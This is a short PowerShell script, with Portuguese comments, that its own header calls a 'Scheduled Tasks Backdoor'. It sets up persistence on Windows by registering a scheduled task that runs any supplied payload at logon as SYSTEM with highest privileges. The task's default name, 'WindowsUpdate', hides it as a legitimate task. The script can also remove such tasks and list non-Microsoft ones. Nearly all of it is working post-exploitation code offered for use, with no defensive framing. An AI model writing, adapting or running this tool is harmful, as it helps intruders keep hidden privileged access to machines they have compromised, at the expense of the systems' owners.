#Requires -Version 5.1
#Requires -RunAsAdministrator

<#
.SYNOPSIS
Scheduled Tasks Backdoor - Cria persistence via tarefas agendadas

.EXAMPLE
.\scheduled-tasks-backdoor.ps1 -TaskName "WindowsUpdate" -Command "C:\payload.exe"
#>

param(
    [string]$TaskName = "WindowsUpdate",
    [string]$Command,
    [string]$Action = "Create"  # Create, Remove, List
)

if ($Action -eq "List") {
    Write-Host "[*] Tarefas agendadas suspeitas:" -ForegroundColor Cyan
    Get-ScheduledTask | Where-Object {$_.Author -notmatch "Microsoft"} | ForEach-Object {
        Write-Host "  • $($_.TaskName)"
    }
    exit
}

if ($Action -eq "Create") {
    $action = New-ScheduledTaskAction -Execute $Command
    $trigger = New-ScheduledTaskTrigger -AtLogon
    $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
    $task = New-ScheduledTask -Action $action -Trigger $trigger -Principal $principal
    
    Register-ScheduledTask -TaskName $TaskName -InputObject $task -Force
    Write-Host "[+] Tarefa criada: $TaskName" -ForegroundColor Green
}

if ($Action -eq "Remove") {
    Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false
    Write-Host "[+] Tarefa removida: $TaskName" -ForegroundColor Green
}
